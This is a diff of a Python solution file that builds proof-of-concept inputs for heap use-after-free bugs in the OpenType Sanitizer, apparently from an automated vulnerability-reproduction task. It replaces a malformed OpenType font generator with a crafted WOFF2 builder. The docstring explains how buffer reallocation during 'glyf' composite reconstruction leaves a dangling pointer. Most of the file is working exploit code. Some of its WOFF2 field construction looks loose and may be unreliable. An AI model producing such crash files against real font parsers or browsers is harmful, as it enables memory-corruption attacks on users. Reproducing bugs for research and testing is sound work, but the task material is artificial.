@@ -1,140 +1,137 @@
 import struct
+import brotli
+
+def uleb128_encode(n: int) -> bytes:
+    """Encodes an integer as an unsigned LEB128 byte sequence."""
+    if n < 0:
+        raise ValueError("Cannot encode negative number.")
+    if n == 0:
+        return b'\x00'
+    result = bytearray()
+    while n > 0:
+        byte = n & 0x7f
+        n >>= 7
+        if n > 0:
+            byte |= 0x80
+        result.append(byte)
+    return bytes(result)
 
 class Solution:
-    """
-    Generates a Proof-of-Concept input that triggers a Heap Use After Free
-    vulnerability in ots::OTSStream::Write.
-    """
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a malformed OpenType font file.
+        Generates a PoC for a heap-use-after-free vulnerability in WOFF2 font parsing.
 
-        The vulnerability is triggered by an inconsistency between the `maxp` and `vhea`
-        tables. Specifically, `vhea.numOfLongVerMetrics` is set to a value greater
-        than `maxp.numGlyphs`. During the sanitization process, OTS attempts to
-        serialize properties shared between the `vhea` and `vmtx` tables. The validation
-        failure (`numOfLongVerMetrics > numGlyphs`) causes an internal shared stream
-        object to be prematurely deallocated after processing the `vhea` table.
-        When the sanitizer then proceeds to process the `vmtx` table, it attempts to
-        write to this deallocated stream, resulting in a use-after-free.
+        The vulnerability, similar to CVE-2016-1646, is in the 'glyf' table reconstruction
+        logic within the OpenType Sanitizer (OTS). The PoC is a crafted WOFF2 file
+        that triggers this vulnerability.
+
+        The exploit mechanism relies on the behavior of ots::OTSStream, a dynamic buffer
+        used during font data reconstruction.
+        1.  We construct a transformed 'glyf' table that defines numerous simple glyphs.
+            The reconstructed size of these glyphs is calculated to fill the OTSStream's
+            initial buffer almost to its capacity (e.g., ~4080 bytes for a 4096-byte buffer).
+        2.  A final composite glyph is defined, which references one of the initial simple
+            glyphs as a component.
+        3.  During processing, the sanitizer copies the component glyph's data from the
+            stream's own buffer to append it to the stream.
+        4.  This copy operation's size is just enough to exceed the buffer's current
+            capacity, triggering a reallocation.
+        5.  The reallocation frees the old buffer, invalidating the source pointer for the
+            copy operation.
+        6.  The subsequent memory copy reads from this dangling pointer, causing a
+            heap-use-after-free, which typically leads to a crash.
         """
-        num_glyphs = 1
-        num_h_metrics = 1
-        # The vulnerability trigger: numOfLongVerMetrics > numGlyphs
-        num_v_metrics = 2
+        # A simple glyph with 1 contour and 2 points reconstructs to 20 bytes.
+        SIMPLE_GLYPH_SIZE = 20
+        # Fill the buffer just shy of a typical 4KB reallocation threshold.
+        NUM_SIMPLE_GLYPHS = 204  # 204 glyphs * 20 bytes/glyph = 4080 bytes
+        # Total glyphs = simple glyphs + 1 composite glyph
+        NUM_GLYPHS = NUM_SIMPLE_GLYPHS + 1
 
-        # --- Table Definitions ---
+        # --- Build the transformed 'glyf' stream payload ---
+        # WOFF2 transformed format consists of several concatenated sub-streams.
+        
+        # 1. Header: (num_glyphs << 2) | loca_format (0 for short)
+        transformed_payload = bytearray(uleb128_encode((NUM_GLYPHS << 2) | 0))
 
-        # 'head' table (Font Header)
-        head_table = struct.pack(
-            '>llLLHHqqhhhhHHHHH',
-            0x00010000,  # version (1.0)
-            0x00010000,  # fontRevision
-            0,           # checkSumAdjustment
-            0x5F0F3CF5,  # magicNumber
-            0b0000000000001011, # flags
-            1000,        # unitsPerEm
-            0,           # created
-            0,           # modified
-            0,           # xMin
-            0,           # yMin
-            100,         # xMax
-            100,         # yMax
-            0,           # macStyle
-            10,          # lowestRecPPEM
-            2,           # fontDirectionHint
-            0,           # indexToLocFormat
-            0            # glyphDataFormat
-        )
+        # 2. nContour stream: one signed 16-bit integer per glyph.
+        nContour_stream = bytearray()
+        for _ in range(NUM_SIMPLE_GLYPHS):
+            nContour_stream += struct.pack('<h', 1)  # 1 contour for simple glyph
+        nContour_stream += struct.pack('<h', -1) # -1 for composite glyph
+        transformed_payload += nContour_stream
 
-        # 'hhea' table (Horizontal Header)
-        hhea_table = struct.pack(
-            '>lhhhHhhhhhhhhhhhhH',
-            0x00010000,  # version
-            800,         # Ascender
-            -200,        # Descender
-            0,           # LineGap
-            1000,        # advanceWidthMax
-            0,           # minLeadingBearing
-            0,           # minTrailingBearing
-            100,         # xMaxExtent
-            1,           # caretSlopeRise
-            0,           # caretSlopeRun
-            0,           # caretOffset
-            0, 0, 0, 0,  # reserved
-            0,           # metricDataFormat
-            num_h_metrics # numberOfHMetrics
-        )
+        # 3. nPoints stream: one ULEB128-encoded integer per contour.
+        # Only simple glyphs contribute to this stream.
+        nPoints_stream = bytearray()
+        for _ in range(NUM_SIMPLE_GLYPHS):
+            nPoints_stream += uleb128_encode(2)  # 2 points per contour
+        transformed_payload += nPoints_stream
 
-        # 'maxp' table (Maximum Profile)
-        maxp_table = struct.pack(
-            '>L' + 'H' * 14,
-            0x00010000,  # version 1.0
-            num_glyphs,  # numGlyphs
-            1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1
-        )
+        # 4. flag stream: one byte per point.
+        # Flag 0x01 indicates an on-curve point.
+        flag_stream = b'\x01' * (NUM_SIMPLE_GLYPHS * 2)
+        transformed_payload += flag_stream
 
-        # 'vhea' table (Vertical Header) - Contains the trigger
-        vhea_table = struct.pack(
-            '>lhhhHhhhhhhhhhhhhH',
-            0x00010000,  # version
-            800,         # vertTypoAscender
-            -200,        # vertTypoDescender
-            0,           # vertTypoLineGap
-            1000,        # advanceHeightMax
-            0,           # minTopSideBearing
-            0,           # minBottomSideBearing
-            100,         # yMaxExtent
-            1,           # caretSlopeRise
-            0,           # caretSlopeRun
-            0,           # caretOffset
-            0, 0, 0, 0,  # reserved
-            0,           # metricDataFormat
-            num_v_metrics # numOfLongVerMetrics -> VULNERABILITY TRIGGER
-        )
+        # 5. glyph stream: coordinates for simple glyphs, then composite data.
+        glyph_stream = bytearray()
+        
+        # Add all x-coordinates for all simple glyphs' points.
+        # Small delta values are encoded compactly.
+        for _ in range(NUM_SIMPLE_GLYPHS * 2):
+            glyph_stream.append(10)
+        
+        # Add all y-coordinates for all simple glyphs' points.
+        for _ in range(NUM_SIMPLE_GLYPHS * 2):
+            glyph_stream.append(10)
+        
+        # Add data for the single composite glyph.
+        # Flags: ARG_1_AND_2_ARE_WORDS (0x0001)
+        glyph_stream += struct.pack('<H', 1)
+        # Glyph index of the component to copy (the first simple glyph).
+        glyph_stream += uleb128_encode(0)
+        # Arguments (x, y offsets) for the component.
+        glyph_stream += struct.pack('<hh', 0, 0)
+        transformed_payload += glyph_stream
+        
+        # --- Compress the transformed payload using Brotli ---
+        compressed_payload = brotli.compress(bytes(transformed_payload))
+        
+        # --- Calculate original table sizes for the WOFF2 directory ---
+        # Estimated size of composite glyph is ~16 bytes.
+        orig_glyf_size = NUM_SIMPLE_GLYPHS * SIMPLE_GLYPH_SIZE + 16
+        # Size of 'loca' table (short format): (num_glyphs + 1) * 2 bytes.
+        orig_loca_size = (NUM_GLYPHS + 1) * 2
 
-        # 'vmtx' table (Vertical Metrics)
-        vmtx_table = struct.pack('>Hh', 1000, 0)
+        # --- Build WOFF2 Table Directory ---
+        table_directory = bytearray()
+        
+        # Entry for 'glyf' table (transformed)
+        table_directory.append(0x40 | 0)  # Flags: transform bit + table index 0
+        table_directory += uleb128_encode(orig_glyf_size)
+        table_directory += uleb128_encode(len(transformed_payload))
+        
+        # Entry for 'loca' table (transformed)
+        table_directory.append(0x40 | 1)  # Flags: transform bit + table index 1
+        table_directory += uleb128_encode(orig_loca_size)
+        table_directory += uleb128_encode(len(transformed_payload))
 
-        tables = {
-            b'head': head_table,
-            b'hhea': hhea_table,
-            b'maxp': maxp_table,
-            b'vhea': vhea_table,
-            b'vmtx': vmtx_table,
-        }
+        total_sfnt_size = orig_glyf_size + orig_loca_size
+        
+        # --- Build WOFF2 Header ---
+        header = bytearray(b'wOF2')
+        header += struct.pack('>I', 0x00010000)  # flavor (TTF)
+        header += struct.pack('>I', 0)            # length (placeholder)
+        header += struct.pack('>H', 2)            # numTables
+        header += struct.pack('>H', 0)            # reserved
+        header += struct.pack('>I', total_sfnt_size)
+        header += struct.pack('>I', len(compressed_payload)) # totalCompressedSize
+        header += struct.pack('>HHHHIIIII', 0, 0, 0, 0, 0, 0, 0, 0, 0) # versions and meta/priv offsets/lengths
 
-        # --- Font Assembly ---
+        # --- Assemble the final PoC file ---
+        poc = header + table_directory + compressed_payload
 
-        sorted_tags = sorted(tables.keys())
-        num_tables = len(sorted_tags)
+        # Update the total file length in the header.
+        struct.pack_into('>I', poc, 8, len(poc))
 
-        # SFNT Header for 5 tables
-        entry_selector = 2
-        search_range = 64
-        range_shift = 16
-
-        header = struct.pack(
-            '>LHHHH',
-            0x00010000,
-            num_tables,
-            search_range,
-            entry_selector,
-            range_shift
-        )
-
-        directory = b''
-        table_data = b''
-        current_offset = 12 + num_tables * 16
-
-        for tag in sorted_tags:
-            data = tables[tag]
-            length = len(data)
-            
-            directory += struct.pack('>4sLLL', tag, 0, current_offset, length)
-            
-            padded_data = data + b'\0' * (-(len(data)) % 4)
-            table_data += padded_data
-            current_offset += len(padded_data)
-
-        return header + directory + table_data
+        return bytes(poc)
